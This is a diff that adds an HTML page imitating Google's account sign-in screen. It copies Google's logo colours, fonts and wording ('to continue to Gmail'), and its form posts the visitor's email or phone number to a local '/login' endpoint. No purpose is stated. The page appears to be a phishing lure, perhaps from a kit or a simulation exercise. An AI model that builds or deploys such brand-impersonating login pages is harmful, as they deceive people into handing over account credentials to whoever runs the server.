@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            background: #f0f2f5;
+            display: flex; justify-content: center; align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background: white; padding: 48px 40px 36px;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1), 0 2px 6px rgba(0,0,0,0.05);
+            width: 100%; max-width: 450px;
+        }
+        .logo {
+            text-align: center; margin-bottom: 24px;
+            font-size: 24px; font-weight: 400;
+            color: #202124;
+        }
+        .logo span:nth-child(1) { color: #4285F4; }
+        .logo span:nth-child(2) { color: #EA4335; }
+        .logo span:nth-child(3) { color: #FBBC04; }
+        .logo span:nth-child(4) { color: #4285F4; }
+        .logo span:nth-child(5) { color: #34A853; }
+        .logo span:nth-child(6) { color: #EA4335; }
+        h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; text-align: center; }
+        .subtitle { text-align: center; color: #202124; font-size: 16px; margin-bottom: 32px; }
+        input {
+            width: 100%; padding: 13px 15px; margin-bottom: 16px;
+            border: 1px solid #dadce0; border-radius: 4px;
+            font-size: 16px; color: #202124;
+        }
+        input:focus { outline: none; border: 2px solid #1a73e8; padding: 12px 14px; }
+        .info {
+            color: #5f6368; font-size: 14px; margin: 16px 0 24px;
+        }
+        .info a { color: #1a73e8; text-decoration: none; font-weight: 500; }
+        .button-row {
+            display: flex; justify-content: space-between; align-items: center;
+            margin-top: 24px;
+        }
+        .link { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
+        .btn {
+            background: #1a73e8; color: white; border: none;
+            padding: 9px 24px; font-size: 14px; font-weight: 500;
+            cursor: pointer; border-radius: 4px;
+        }
+        .btn:hover { background: #1765cc; }
+        .footer { margin-top: 48px; padding-top: 16px; display: flex; justify-content: space-between; color: #5f6368; font-size: 13px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+        </div>
+        <h1>Sign in</h1>
+        <p class="subtitle">to continue to Gmail</p>
+        <form id="login-form" method="POST" action="/login">
+            <input type="email" name="identifier" placeholder="Email or phone" required autofocus>
+            <p class="info">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></p>
+            <div class="button-row">
+                <a href="#" class="link">Create account</a>
+                <button type="submit" class="btn" id="identifierNext">Next</button>
+            </div>
+        </form>
+        <div class="footer">
+            <select><option>English (United States)</option></select>
+            <div>Help | Privacy | Terms</div>
+        </div>
+    </div>
+</body>
+</html>
